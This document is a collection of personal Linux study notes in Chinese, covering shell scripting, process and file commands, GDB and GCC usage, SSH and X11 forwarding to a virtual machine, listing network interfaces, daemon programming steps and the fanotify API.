<p>cmd1 &amp;&amp; cmd2	1. 若 cmd1 执行完毕且正确执行($?=0)，则开始执行 cmd2</p>
<ol>
<li>若 cmd1 执行完毕且为错误 ($?≠0)，则 cmd2 不执行。
cmd1 || cmd2		1. 若 cmd1 执行完毕且正确执行($?=0)，则 cmd2 不执行。
2.若 cmd1 执行完毕且为错误 ($?≠0)，则开始执行 cmd2
cmd1 &amp;&amp; cmd2 || cmd3		正确执行cmd2，错误执行cmd3
；				就是都执行啦
管道pipe：
left | right		把左边的stdout输送到右边的stdin
某些指令需要用到文件名 (例如 tar) 来进行处理时，该 stdin 与 stdout 可以利用减号 &quot;-&quot;
tar -cv -f - aaa bbb | tar -xv -C ~		这里的-就代表标准输出</li>
</ol>
<p>通配符：这是bash内置的通配符，不是正则表达式</p>
<pre><code>* 		代表『 0 个到无穷多个』任意字符
? 		代表『一定有一个』任意字符
[ ]		同样代表『一定有一个在括号内』的字符(非任意字符)。[abcd] 代表一定有一个abcd中的字符
[ - ]		若有减号在中括号内时，代表『在编码顺序内的所有字符』。例如 [0-9] 代表 0 到 9 之间的所有数字
[^ ]		若中括号内的第一个字符为指数符号 (^) ，那表示『反向选择』，例如 [^abc] 代表一定有一个非abc字符
</code></pre>
<h1 id="shell脚本"><a class="header" href="#shell脚本">shell脚本</a></h1>
<p>就像Windows里的.bat	里头就是Linux指令，多以.sh为后缀
# 后面跟注释
鸟哥建议在开头注释的内容：script 的功能；script 的版本信息；script 的作者与联络方式；script 的版权宣告方式；script 的 History (历史纪录)；script 内较特殊的指令，使用『绝对路径』的方式来下达；script 运作时需要的环境变量预先宣告与设定。
变量：
变量的命名和C语言十分类似，一般系统的变量都是大写字母。
使用变量的值：	$var	或 ${var}
删除变量：	unset var
字符串：				没有引号也是字符串，就是空格要转义</p>
<pre><code>“”		双引号，里头可以有命令替换$(command)和变量${variable}
‘’		单引号，里头的字符就是单纯的字符，raw
``              反引号，里头放命令，会被执行
</code></pre>
<p>数组：		var=(value1 value2 value3)	中间用空格隔开，或者 var[n]=value
使用数组的值${a[1]}
变量有环境变量和局部变量两种。环境变量可以理解为全局变量。</p>
<p>修改字符串：</p>
<pre><code>#		${var#keyword}		如果变量从头开始的数据符合关键字，将符合的最短数据删
##		${var##keyword}		如果变量从头开始的数据符合关键字，将符合的最长数据删
%		${var%keyword}		如果变量从尾开始的数据符合关键字，将符合的最短数据删
%%		${var%%keyword}		如果变量从尾开始的数据符合关键字，将符合的最长数据删
/		${var/oldstr//newstr}	将变量符合的第一个oldstr换成newstr
${var//oldstr/newstr}	将变量符合的所有oldstr换成newstr
</code></pre>
<p>这里似乎是可以用正则表达式的
整数运算：
var=$((运算内容))				感觉有点像eval?
declare -i var=运算内容</p>
<p>shell脚本的参数：</p>
<pre><code>${number}		第几个参数
$#				参数个数
$@				全部参数，空格隔开
shift				变量偏移，把前面的变量移走	shift 3
</code></pre>
<p>变量测试：（不知道有什么用。。）P448插眼</p>
<p>env		查看环境变量
set		查看所有变量
export	把局部变量转换成环境变量	export var 
read		读取变量的值 		-p提示字符 	read -p “please input xx: ” var
declare	设置变量类型和属性		-i整数
echo		输出
test		检查当前文件的属性和权限，逻辑判断。没有输出，与&amp;&amp; || if配合使用，
[  ]是test命令的另一种形式，注意两边有空格，中间输test的表达式
sh		shell的debug命令</p>
<p>条件表达式：
if	[test-expr]; then
...
else
...
fi
函数：
function name(){
...
}
循环：
while [ test-expr ]
do
...
done</p>
<p>until [ test-expr ]
do
...
done</p>
<p>for var in xx,xxx,
do
...
done</p>
<p>for (( i=1; i&lt;=${nu}; i=i+1 ))
do
...
done</p>
<h1 id="正则表达式regular-expression略"><a class="header" href="#正则表达式regular-expression略">正则表达式regular expression（略）</a></h1>
<p>有些命令是支持正则表达式的，如果不支持的话也可以用bash内建的通配符。
比如grep/vim都是支持RE的</p>
<h1 id="网络"><a class="header" href="#网络">网络</a></h1>
<pre><code>netstat		显示所有打开的服务以及Socket
telnet          远程登录到网络上的某一台服务器主机
nc
ping        
ifconfig        网卡配置
</code></pre>
<h1 id="例行性工作"><a class="header" href="#例行性工作">例行性工作</a></h1>
<p>at ：at 是个可以处理仅执行一次就结束排程的指令，不过要执行 at 时， 必须要有 atd 这个服务 (第十七章) 的支援才行。在某些新版的 distributions 中，atd 可能预设并没有启动，那么 at 这个指令就会失效呢！不过我们的 CentOS 预设是启动的！	crontab ：crontab 这个指令所设定的工作将会循环的一直进行下去！ 可循环的时间为分钟、小时、每周、每月或每年等。crontab 除了可以使用指令执行外，亦可编辑 /etc/crontab 来支持。 至于让 crontab 可以生效的服务则是 crond 这个服务</p>
<h1 id="进程管理"><a class="header" href="#进程管理">进程管理</a></h1>
<p>进程 (process)：程序被触发后，执行者的权限与属性、程序的程序代码与所需数据等都会被加载内存中， 操作系统并给予这个内存内的单元一个标识符 (PID)。
子进程：子进程可以继承父进程的环境变量，通过PPID判断父进程是什么。
进程都会藉由父进程以fork的方式产生一个一模一样的子进程， 然后被复制出来的子进程再以exec的方式来执行实际要进行的程序，最终就成为一个子进程的存在。
服务(daemon)：常驻在内存当中的进程通常都是负责一些系统所提供的功能以服务用户各项任务，因此这些常驻程序就会被我们称为服务。</p>
<p>ps			列出进程		-l列出详细信息		-lA或aux列出系统中的所有进程（默认是bash中的进程）
axjf列出进程树
F：代表这个进程旗标 (process flags)，说明这个进程的总结权限，常见号码有： 
若为 4 表示此进程的权限为 root。 
若为 1 则表示此子进程仅进行复制(fork)而没有实际执行(exec)。
S：代表这个进程的状态 (STAT)，主要的状态有： 
R (Running)：该程序正在运作中；。
S (Sleep)：该程序目前正在睡眠状态(idle)，但可以被唤醒(signal)。 
D：不可被唤醒的睡眠状态，通常这支程序可能在等待 I/O 的情况(ex&gt;打印)。 
T：停止状态(stop)，可能是在工作控制(背景暂停)或除错 (traced) 状态。 
Z (Zombie)：僵尸状态，进程已经终止但却无法被移除至内存。
C：代表 CPU 使用率，单位为百分比
PRI/NI：Priority/Nice 的缩写，代表此进程被 CPU 所执行的优先级，数值越小代表该进程越快被 CPU 执行。	ADDR：是 kernel function，指出该进程在内存的哪个部分，如果是个running 的进程，一般就会显示-
SZ：代表此进程用掉多少内存 。
WCHAN：表示目前进程是否运作中，同样的， 若为 - 表示正在运行
TIME：使用掉的 CPU 时间
pstree		画出进程树
top			动态监测进程
-p PID 观察指定进程
在命令行的最后输入 &amp;，可以让命令在背景中执行	
Ctrl+z		将进程放到bash后台中并暂停(Ctrl+D表示EOF)
jobs			查看bash后台运行的进程
fg			将后台的进程放到前台运行		fg %jobnumber
bg			将后台暂停的进程在后台继续运行	bg %jobnumber
kill			给进程发信号signal				kill -signal %jobnumber/PID
-l列出kill中的信号有哪些
nohup		将进程放到系统后台执行，配合&amp;
renice		赋给进程新的nice值，影响程序执行的优先级		renice -n number -p PID
nice 值可调整的范围为 -20 ~ 19 ；	
root 可随意调整自己或他人进程的 Nice 值，且范围为 -20 ~ 19 
一般使用者仅可调整自己进程的 Nice 值，且范围仅为 0 ~ 19 (避免一般用户抢占系统资源)
nice			赋给进程nice值	nice -n number command
free			观察内存和Swap的使用情况
vmstat 		可以侦测『 CPU / 内存 / 磁盘输入输出状态 』等等，
fuser		藉由文件(或文件系统)找出正在使用该文件的进程
-m,--mount            show all processes using the named filesystems or block device
fuser -uvm filename列出占用文件的进程	fuser -mki filename杀死占用文件的进程
lsof			查看进程开启的文件（不加选项多的一匹）
-p指定PID 		-u指定User		+d指定目录</p>
<h1 id="软件安装"><a class="header" href="#软件安装">软件安装</a></h1>
<p>执行configure来建立Makefile
用make指令执行Makefile完成编译
sudo apt-get autoremove xxx 卸载软件</p>
<h1 id="gdb"><a class="header" href="#gdb">GDB</a></h1>
<p>1<br />
list	l	显示多行源代码
break	b	设置断点,程序运行到断点的位置会停下来
info	i	描述程序的状态
run	r	开始运行程序
display	disp	跟踪查看某个变量,每次停下来都显示它的值
step	s	执行下一条语句,如果该语句为函数调用,则进入函数执行其中的第一条语句
next	n	执行下一条语句,如果该语句为函数调用,不会进入函数内部执行(即不会一步步地调试函数内部语句)
print	p	打印内部变量值
continue	c	继续程序的运行,直到遇到下一个断点
set var name=v	 	设置变量的值
start	st	开始执行程序,在main函数的第一条语句前面停下来
file	 	装入需要调试的程序
kill	k	终止正在调试的程序
watch	 	监视变量值的变化
backtrace	bt	产看函数调用信息(堆栈)
frame	f	查看栈帧
quit	q	退出GDB环境</p>
<h2 id="gcc"><a class="header" href="#gcc">GCC</a></h2>
<p>基本操作
gcc -c file1.c file2.c			把文件编译成可重定位目标文件 .o
gcc -o out file1.o file2.o		把可重定位目标文件、静态库、动态链接库链接成为可执行目标文件
静态库在Linux中以存档（archive）.a的形式储存
动态链接库在Linux中以.so的形式储存
-Onumber				优化</p>
<p>gcc -shared -fpic -o libname.so file1.c file2.c		编译一个动态链接库
ar rcs libname.a file1.o file2.o						编译一个静态库</p>
<p>makefile这个内容太多了，先略过。可以认为是自动化编译的脚本。
target... : prerequisites ...
command</p>
<p>target也就是一个目标文件，可以是Object File，也可以是执行文件。还可以是一个标签（Label），对于标签这种特性，在后续的“伪目标”章节中会有叙述。
 prerequisites就是，要生成那个target所需要的文件或是目标。
command也就是make需要执行的命令，前面要有个Tab。（任意的Shell命令）</p>
<h2 id="日常使用"><a class="header" href="#日常使用">日常使用</a></h2>
<ul>
<li>本地DNS服务器：
查看 <code>cat /etc/resolv.conf</code>，你可以自己修改，也可能被<a href="https://baike.baidu.com/item/DHCP/218195?fr=aladdin">DHCP</a>协议分配。</li>
<li>设置代理：</li>
</ul>
<pre><code> export http_proxy=&quot;http://proxy-XXXXX&quot;
 export https_proxy=&quot;https://proxy-XXXXX:&quot;
</code></pre>
<p>取消代理：</p>
<pre><code>unset http_proxy
unset https_proxy
</code></pre>
<p>（这个环境变量的改变都是临时的，只在当前的shell下生效。）</p>
<ul>
<li>
<p>生成一对秘钥-使用 ssh-keygen</p>
</li>
<li>
<p>把ls的结果按照文件大小排序：ls -l | sort  +4 -n</p>
</li>
</ul>
<p>lspci:在系统中显示有关pci总线的信息以及连接到它们的设备。</p>
<p>寻找文件：<strong>find</strong>指令
<code>find -name *demo* #寻找文件名中带有demo的文件，有些目录的查找需要root权限</code></p>
<ul>
<li>计算文件的SHA
sha双击Tab之后，顾名思义啦
sha1sum          sha256sum        sha512sum        shapeclustering  sharesec<br />
sha224sum        sha384sum        shadowconfig     shar             shasum</li>
</ul>
<h2 id="指令"><a class="header" href="#指令">指令</a></h2>
<h3 id="kill命令对进程发信号"><a class="header" href="#kill命令对进程发信号">kill命令————对进程发信号</a></h3>
<p>kill -signal pid
kill -l显示所有信号，常用的有下面几个：
1 (HUP)：重新加载进程。
9 (KILL)：杀死一个进程。
15 (TERM)：正常停止一个进程。</p>
<h3 id="file命令查看文件类型"><a class="header" href="#file命令查看文件类型">file命令————查看文件类型</a></h3>
<h3 id="目录操作命令-1"><a class="header" href="#目录操作命令-1">目录操作命令：</a></h3>
<pre><code>cd		change directory切换目录
pwd		显示当前目录
mkdir	创建新的空目录
rmdir	删除空目录

ls		列出文件	-R递归列出子文件	-l详细信息
cp		复制（建立链接，更新文件）	-a完全复制，权限不变	-l创建硬链接	-s创建软链接 -r目录复制 
在默认情况下，会改变群组和权限
mv		移动目录，重命名	
mv source1 source2 ... destination, cp也一样
rm		移除文件		-r递归删除目录 -i删除前询问 -f强制删除，忽略不存在的文件

basename	路径中的档名
dirname		路径中的目录名
touch	改变文件时间戳，创建新文件	-a只修改atime -m只修改mtime -t修改成任意时间（默认为现在）
</code></pre>
<h3 id="文件读取命令-1"><a class="header" href="#文件读取命令-1">文件读取命令：</a></h3>
<pre><code>cat 		从第一行开始显示文件内容 -n显示行号
tac		从最后一行开始显示文件内容
nl		显示文件内容的时候输出行号
less		分页显示，比more好用
[Space][PgDown]向下翻页	[PgUp]向上翻页	/向下字符串搜索	？向上字符串搜索	q离开	
G最后一行	g第一行	n/N切换搜索结果
od		以二进制方式读取文件内容 	-t xCc：ASCII对照表
head	看文件头几行
tail		看文件末几行
head和tail可以配合使用，如查看11-20行：head -n 20 filename | tail -n 10
</code></pre>
<h3 id="文件操作命令-1"><a class="header" href="#文件操作命令-1">文件操作命令</a></h3>
<pre><code>grep		在输入中寻找匹配的字符(RE)，输出匹配的行		grep [option] pattern file1 file2 ...
cut		-d后面接分隔字符，与 -f 一起使用		-f依据-d的分隔字符将一段讯息分区成为数段，用 -f取出第几段
-c以字符 (characters) 的单位取出固定字符区，用于排列整齐的输出，比如ls -l | cut -c 1-10
sort		排序，默认为字典序。
uniq		对连续重复的条目去重计数
Note: 'uniq' does not detect repeated lines unless they are adjacent.
You may want to sort the input first, or use 'sort -u' without 'uniq'.
wc		对文件的行数、字数、字符数进行统计。

tr		进行字符的删除替换		tr ... old new	把...中的old换成new
tr ... -b old	删除...中的old
col		把tab换成对应个数的空格
split		把一个大文件拆成若干个小文件 	-b按大小拆分		-l按行数拆分		split [option] filename prefix
xargs	给命令提供参数，对于不能用Pipe的命令。
-n一次接受的最大参数	-p执行命令前询问
xargs [option] command ,然后从标准输入获得arguments	
printf	格式化输出，有点像C语言，但是分隔符是空格
awk		一个处理行数据的工具，会把file的行根据空白符拆分成字段，$1 $2 ...，$0代表整行
awk ‘条件表达式{指令} 条件表达式{指令}...’	filename		条件表达式为真会执行指令
diff		顾名思义，比较两个文本文件或目录的差异，逐行比较 	diff from-file to-file
-b忽略空白数不同的差异		-B忽略空白行的差异		-i忽略大小写的差异
cmp		比较两个文件的差异，逐字节比较
patch	更新指令，插眼
pr		打印准备指令、略
</code></pre>
<h3 id="文件信息和查找命令-1"><a class="header" href="#文件信息和查找命令-1">文件信息和查找命令</a></h3>
<pre><code>file		查看文件类型
which	查找脚本文件
whereis	在特定的目录下查找文件	-l列出特定的目录
locate	在系统的数据库中查找文件
deepin系统默认没有安装locate.
updatedb更新数据库
find		根据条件寻找文件，并可以对找到的结果执行action脚本。
find [PATH] [Option] [Action] 
例如：find -name 'DOC*' -exec ls -l {} \;		这里还有正则表达式
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux使用ssh远程登录"><a class="header" href="#linux使用ssh远程登录">Linux使用SSH远程登录</a></h1>
<p>我的需求是本地VMware上开一个虚拟机，然后在主机上连接。两个都是Linux但是版本不同。</p>
<h2 id="主机虚拟机的操作"><a class="header" href="#主机虚拟机的操作">主机（虚拟机）的操作</a></h2>
<p>一般来说ssh是默认安装好的。如果没有，用<code> sudo aptitude install openssh-server</code>。这是最普遍的ssh工具。
然后启动ssh-server：<code>/etc/init.d/ssh start</code>
有时候是默认启动的。我们可以用<code>service ssh status</code>看ssh的状态。
因为连接需要知道IP地址，我们用<code>ifconfig</code>命令查看。
inet addr:172.16.57.133 (可以看到这是内网地址啦)</p>
<h2 id="客户机我的电脑的操作"><a class="header" href="#客户机我的电脑的操作">客户机（我的电脑）的操作</a></h2>
<p>当然前提是主机也要安装好ssh。
<code>ssh root@172.16.57.133</code>就可以连接了。然后需要输入密码。</p>
<p>事实上我们可以用过秘钥公钥来简化登录过程。虽然但是，没必要。</p>
<h2 id="图形界面"><a class="header" href="#图形界面">图形界面</a></h2>
<ol>
<li>
<p>Your client must be set up to forward X11.</p>
</li>
<li>
<p>Your server must be set up to allow X11 forwarding.</p>
</li>
<li>
<p>Your server must be able to set up X11 authentication.</p>
</li>
<li>
<p>On your server, make sure <code>/etc/ssh/sshd_config</code> contains:</p>
<pre><code>X11Forwarding yes
X11DisplayOffset 10
</code></pre>
<p>You may need to SIGHUP <code>sshd</code> so it picks up these changes.</p>
<pre><code>cat /var/run/sshd.pid | xargs kill -1
</code></pre>
</li>
<li>
<p>On your server, make sure you have <code>xauth</code> installed.</p>
<pre><code>belden@skretting:~$ which xauth
/usr/bin/xauth
</code></pre>
<p>If you do not have <code>xauth</code> installed, you will run into the <code>empty DISPLAY environment variable</code> problem.</p>
</li>
<li>
<p>On your client, connect to your server. Be certain to tell ssh to allow X11 forwarding. I prefer</p>
<pre><code>belden@skretting:~$ ssh -X blyman@the-server
</code></pre>
</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h1 id="在linux中找到可用的网络接口"><a class="header" href="#在linux中找到可用的网络接口">在Linux中找到可用的网络接口</a></h1>
<p>原文链接：https://linux.cn/article-10635-1.html</p>
<p>我们可以使用下面的这些方法来找到可用的网络接口。</p>
<h2 id="方法-1-使用-ifconfig-命令"><a class="header" href="#方法-1-使用-ifconfig-命令">方法 1 使用 ifconfig 命令</a></h2>
<p>使用 <code>ifconfig</code> 命令来查看网络接口仍然是最常使用的方法。我相信还有很多 Linux 用户仍然使用这个方法。</p>
<pre><code>$ ifconfig -a
</code></pre>
<p>示例输出：</p>
<pre><code>enp5s0: flags=4098&lt;BROADCAST,MULTICAST&gt; mtu 1500    ether 24:b6:fd:37:8b:29 txqueuelen 1000 (Ethernet)    RX packets 0 bytes 0 (0.0 B)    RX errors 0 dropped 0 overruns 0 frame 0    TX packets 0 bytes 0 (0.0 B)    TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536    inet 127.0.0.1 netmask 255.0.0.0    inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt;    loop txqueuelen 1000 (Local Loopback)    RX packets 171420 bytes 303980988 (289.8 MiB)    RX errors 0 dropped 0 overruns 0 frame 0    TX packets 171420 bytes 303980988 (289.8 MiB)    TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0wlp9s0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500    inet 192.168.225.37 netmask 255.255.255.0 broadcast 192.168.225.255    inet6 2409:4072:6183:c604:c218:85ff:fe50:474f prefixlen 64 scopeid 0x0&lt;global&gt;    inet6 fe80::c218:85ff:fe50:474f prefixlen 64 scopeid 0x20&lt;link&gt;    ether c0:18:85:50:47:4f txqueuelen 1000 (Ethernet)    RX packets 564574 bytes 628671925 (599.5 MiB)    RX errors 0 dropped 0 overruns 0 frame 0    TX packets 299706 bytes 60535732 (57.7 MiB)    TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
</code></pre>
<p>如上面的输出所示，在我的 Linux 机器上有两个网络接口，它们分别叫做 <code>enp5s0</code>（主板上的有线网卡）和 <code>wlp9s0</code>（无线网卡）。其中的 <code>lo</code> 是环回网卡，被用来访问本地的网络的服务，通常它的 IP 地址为 <code>127.0.0.1</code>。</p>
<p>我们也可以在许多 UNIX 变种例如 FreeBSD 中使用相同的 <code>ifconfig</code> 来列出可用的网卡。</p>
<h2 id="方法-2-使用-ip-命令"><a class="header" href="#方法-2-使用-ip-命令">方法 2 使用 ip 命令</a></h2>
<p>在最新的 Linux 版本中， <code>ifconfig</code> 命令已经被弃用了。你可以使用 <code>ip</code> 命令来罗列出网络接口，正如下面这样：</p>
<pre><code>$ ip link show
</code></pre>
<p>示例输出：</p>
<pre><code>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000   link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:002: enp5s0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000    link/ether 24:b6:fd:37:8b:29 brd ff:ff:ff:ff:ff:ff3: wlp9s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP mode DORMANT group default qlen 1000    link/ether c0:18:85:50:47:4f brd ff:ff:ff:ff:ff:ff
</code></pre>
<p>你也可以使用下面的命令来查看。</p>
<pre><code>$ ip addr
$ ip -s link
</code></pre>
<p>这两个命令（<code>ifconfig</code> 和 <code>ip</code>）已经足够在你的 Linux 系统中查看可用的网卡了。</p>
<p>然而，仍然有其他方法来列出 Linux 中的网络接口，下面我们接着看。</p>
<h4 id="方法-3-使用-sysclassnet-目录"><a class="header" href="#方法-3-使用-sysclassnet-目录">方法 3 使用 /sys/class/net 目录</a></h4>
<p>Linux 内核将网络接口的详细信息保存在 <code>/sys/class/net</code> 目录中，你可以通过查看这个目录的内容来检验可用接口的列表是否和前面的结果相符。</p>
<pre><code>$ ls /sys/class/net
</code></pre>
<p>示例输出：</p>
<pre><code>enp5s0 lo wlp9s0
</code></pre>
<h4 id="方法-4-使用-procnetdev-目录"><a class="header" href="#方法-4-使用-procnetdev-目录">方法 4 使用 /proc/net/dev 目录</a></h4>
<p>在 Linux 操作系统中，文件 <code>/proc/net/dev</code> 中包含有关网络接口的信息。</p>
<p>要查看可用的网卡，只需使用下面的命令来查看上面文件的内容：</p>
<pre><code>$ cat /proc/net/dev
</code></pre>
<p>示例输出：</p>
<pre><code>Inter-| Receive | Transmitface |bytes packets errs drop fifo frame compressed multicast|bytes packets errs drop fifo colls carrier compressedwlp9s0: 629189631 566078 0 0 0 0 0 0 60822472 300922 0 0 0 0 0 0enp5s0: 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0lo: 303980988 171420 0 0 0 0 0 0 303980988 171420 0 0 0 0 0 0
</code></pre>
<h4 id="方法-5-使用-netstat-命令"><a class="header" href="#方法-5-使用-netstat-命令">方法 5 使用 netstat 命令</a></h4>
<p><code>netstat</code> 命令可以列出各种不同的信息，例如网络连接、路由表、接口统计信息、伪装连接和多播成员等。</p>
<pre><code>$ netstat -i
</code></pre>
<p>示例输出：</p>
<pre><code>Kernel Interface tableIface MTU RX-OK RX-ERR RX-DRP RX-OVR TX-OK TX-ERR TX-DRP TX-OVR Flglo 65536 171420 0 0 0 171420 0 0 0 LRUwlp9s0 1500 565625 0 0 0 300543 0 0 0 BMRU
</code></pre>
<p>请注意 <code>netstat</code> 被弃用了， <code>netstat -i</code> 的替代命令是 <code>ip -s link</code>。另外需要注意的是这个方法将只列出激活的接口，而不是所有可用的接口。</p>
<h4 id="方法-6-使用-nmcli-命令"><a class="header" href="#方法-6-使用-nmcli-命令">方法 6 使用 nmcli 命令</a></h4>
<p><code>nmcli</code> 是一个用来控制 NetworkManager 和报告网络状态的命令行工具。它可以被用来创建、展示、编辑、删除、激活、停用网络连接和展示网络状态。</p>
<p>假如你的 Linux 系统中安装了 NetworkManager，你便可以使用下面的命令来使用 <code>nmcli</code> 列出可以的网络接口：</p>
<pre><code>$ nmcli device status
</code></pre>
<p>或者</p>
<pre><code>$ nmcli connection show
</code></pre>
<p>现在你知道了如何在 Linux 中找到可用网络接口的方法，接下来，请查看下面的指南来知晓如何在 Linux 中配置 IP 地址吧。</p>
<ul>
<li><a href="https://www.ostechnix.com/configure-static-ip-address-linux-unix/">如何在 Linux 和 Unix 中配置静态 IP 地址</a></li>
<li><a href="https://www.ostechnix.com/how-to-configure-ip-address-in-ubuntu-18-04-lts/">如何在 Ubuntu 18.04 LTS 中配置 IP 地址</a></li>
<li><a href="https://www.ostechnix.com/configure-static-dynamic-ip-address-arch-linux/">如何在 Arch Linux 中配置静态和动态 IP 地址</a></li>
<li><a href="https://www.ostechnix.com/how-to-assign-multiple-ip-addresses-to-single-network-card-in-linux/">如何在 Linux 中为单个网卡分配多个 IP 地址</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="linux-program"><a class="header" href="#linux-program">Linux Program</a></h1>
<p>之前想把《Unix/Linux 系统编程》过一遍的，不过没有找到时间，零散的看了一些需要的内容，做了一些笔记。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="daemon"><a class="header" href="#daemon">Daemon</a></h1>
<p>daemon是一种具备下列特征的进程：</p>
<ul>
<li>它的生命周期很长。通常，一个 daemon 会在系统启动的时候被创建并一直运行直至
系统被关闭。</li>
<li>它在后台运行并且不拥有控制终端。控制终端的缺失确保了内核永远不会为 daemon
自动生成任何任务控制信号以及终端相关的信号（如 SIGINT、SIGTSTP 和 SIGHUP）</li>
</ul>
<p>通常会将 daemon 程序的名称以字母 d 结尾（但并不是所有人都遵循这个惯例）。</p>
<h2 id="编写daemon程序"><a class="header" href="#编写daemon程序">编写Daemon程序</a></h2>
<p>参考《Unix系统编程手册》第37章。</p>
<ol>
<li>执行一个 fork()，之后父进程退出，子进程继续执行（结果是 daemon 成为了 init 进程的子进程）。之所以要做这一步是因为下面两个原因。
<ul>
<li>假设 daemon 是从命令行启动的，父进程的终止会被 shell 发现，shell 在发现之后会显
示出另一个 shell 提示符并让子进程继续在后台运行。</li>
<li>子进程被确保不会成为一个进程组首进程，因为它从其父进程那里继承了进程组 ID
并且拥有了自己的唯一的进程 ID，而这个进程 ID 与继承而来的进程组 ID 是不同的，
这样才能够成功地执行下面一个步骤。</li>
</ul>
</li>
<li>子进程调用 <code>setsid()</code>开启一个新会话并释放它与控制终端之间的所有关联关系。</li>
<li>如果 daemon 从来没有打开过终端设备，那么就无需担心 daemon 会重新请求一个控制终端了。如果daemon 后面可能会打开一个终端设备，那么必须要采取措施来确保这个设备不会成为控制终端。这可以通过下面两种方式实现。
<ul>
<li>在所有可能应用到一个终端设备上的 open()调用中指定 O_NOCTTY 标记。</li>
<li>或者更简单地说，在 setsid()调用之后执行第二个 fork()，然后再次让父进程退出并让孙子进程继续执行。这样就确保了子进程不会成为会话组长，因此根据 System V 中获取终端的规则（Linux 也遵循了这个规则），进程永远不会重新请求一个控制终端。</li>
</ul>
</li>
<li>清除进程的 umask 以确保当 daemon 创建文件和目录时拥有所需的权限。</li>
<li>修改进程的当前工作目录，通常会改为根目录（/）。这样做是有必要的，因为 daemon 通常会一直运行直至系统关闭为止。如果 daemon 的当前工作目录为不包含/的文件系统，那么就无法卸载该文件系统。或者 daemon 可以将工作目录改为完成任务时所在的目录或在配置文件中定义的一个目录，只要包含这个目录的文件系统永远不会被卸载即可。如 cron 会将自身放在/var/spool/cron 目录下。</li>
<li>关闭 daemon 从其父进程继承而来的所有打开着的文件描述符。（daemon 可能需要保持继承而来的文件描述的打开状态，因此这一步是可选的或者是可变更的。）之所以需要这样做的原因有很多。由于 daemon 失去了控制终端并且是在后台运行的，因此让 daemon 保持文件描述符 0、1 和 2 的打开状态毫无意义，因为它们指向的就是控制终端。此外，无法卸载长时间运行的 daemon 打开的文件所在的文件系统。因此，通常的做法是关闭所有无用的打开着的文件描述符，因为文件描述符是一种有限的资源。</li>
<li>在关闭了文件描述符 0、1 和 2 之后，daemon 通常会打开/dev/null 并使用 dup2()（或类似的函数）使所有这些描述符指向这个设备。之所以要这样做是因为下面两个原因。
<ul>
<li>它确保了当 daemon 调用了在这些描述符上执行 I/O 的库函数时不会出乎意料地失败。</li>
<li>它防止了 daemon 后面使用描述符 1 或 2 打开一个文件的情况，因为库函数会将这些描述符当做标准输出和标准错误来写入数据（进而破坏了原有的数据）。</li>
</ul>
</li>
</ol>
<p>很多标准的 daemon是通过在系统关闭时执行特定于应用程序的脚本来停止的。而那些不以这种方式终止的daemon 会收到一个 SIGTERM 信号，因为在系统关闭的时候 init 进程会向所有其子进程发送这个信号。在默认情况下，SIGTERM 信号会终止一个进程。如果 daemon 在终止之前需要做些清理工作，那么就需要为这个信号建立一个处理器。这个处理器必须能<strong>快速地完成清理工作</strong>。</p>
<p>由于 daemon 是长时间运行的，因此要特别小心潜在的<strong>内存泄露问题</strong>和<strong>文件描述符泄露</strong>（即应用程序没有关闭所有打开着的文件描述符）。</p>
<p>因为 daemon 程序不能使用标准输出，我们通常使用<code>syslog</code>进行日志的记录。</p>
<h2 id="crate--daemonize"><a class="header" href="#crate--daemonize">Crate  <a href="https://docs.rs/daemonize/0.4.1/daemonize/">daemonize</a></a></h2>
<p>daemonize is a library for writing system daemons.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="fanotify"><a class="header" href="#fanotify">Fanotify</a></h1>
<blockquote>
<p>The fanotify API provides notification and interception of filesystem events.  Use cases include virus scanning and hierarchical storage management.  In the original fanotify API, only a limited set of events was supported.  In particular, there was no support for create, delete, and move events.  The support for those events was added in Linux 5.1.  (See inotify(7) for details of an API that did notify those events pre Linux 5.1.)</p>
</blockquote>
<h2 id="关键接口"><a class="header" href="#关键接口">关键接口</a></h2>
<ol>
<li><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html"><code>fanotify_init</code></a> : 创建一个<code>fd</code>供监控者使用。在内核中这个<code>fd</code>对应一个<code>fsnotify_group</code>结构</li>
<li><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html"><code>fanotify_mark</code></a>: 确定需要监控哪些<code>文件对象</code>以及哪些类型的<code>事件消息</code>。在内核中会把<code>fsnotify_group</code>和需要监控的<code>文件对象</code>链接起来。</li>
<li>用户调用<code>read()</code>函数来读取<code>fd</code>接收到的监控<code>事件消息</code>并处理。在内核中<code>文件对象</code>发生相应类型的<code>事件</code>时，会把<code>事件消息</code>发送到<code>fsnotify_group</code>的接收消息队列中。</li>
</ol>
<pre><code class="language-c">#include &lt;fcntl.h&gt;            /* Definition of O_* constants */
#include &lt;sys/fanotify.h&gt;

int fanotify_init(unsigned int flags, unsigned int event_f_flags);
</code></pre>
<p><code>flags</code>可以是下表三个宏中的一个，以及一些<a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html#DESCRIPTION">其他的宏</a>的组合。他决定了要接受的通知类型。</p>
<div class="table-wrapper"><table><thead><tr><th>Macro</th><th>Meaning</th></tr></thead><tbody>
<tr><td>FAN_CLASS_PRE_CONTENT</td><td>当文件要被访问时，发送一个event并询问访问permission decisions。它适用于需要在包含最终数据之前访问文件的Listener。</td></tr>
<tr><td>FAN_CLASS_CONTENT</td><td>当文件要被访问时，发送一个event并询问访问permission decisions。它适用于需要访问已经包含最终内容的文件的Listener。</td></tr>
<tr><td>FAN_CLASS_NOTIF</td><td>当文件要被访问时，发送一个event。</td></tr>
</tbody></table>
</div>
